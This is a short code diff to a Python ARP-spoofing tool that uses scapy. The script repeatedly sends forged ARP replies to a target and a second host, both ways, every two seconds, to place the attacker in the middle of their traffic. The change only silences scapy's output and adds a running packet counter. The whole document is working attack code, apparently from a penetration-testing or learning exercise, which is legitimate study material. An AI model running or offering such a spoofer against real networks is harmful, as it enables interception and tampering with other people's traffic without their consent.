@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import argparse
 import time
+import sys
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -27,10 +28,14 @@ def spoof(target, spoof):
     target_mac = get_mac(target)
     packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
     # to list all the parameters : scapy.ls(scapy.ARP)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 options = get_arguments()
+sent_packets = 0
 while True:
     spoof(options.target, options.spoof)
     spoof(options.spoof,options.target)
+    sent_packets += 2
+    print("\r[+] Packets sent: " + str(sent_packets)),
+    sys.stdout.flush()
     time.sleep(2)
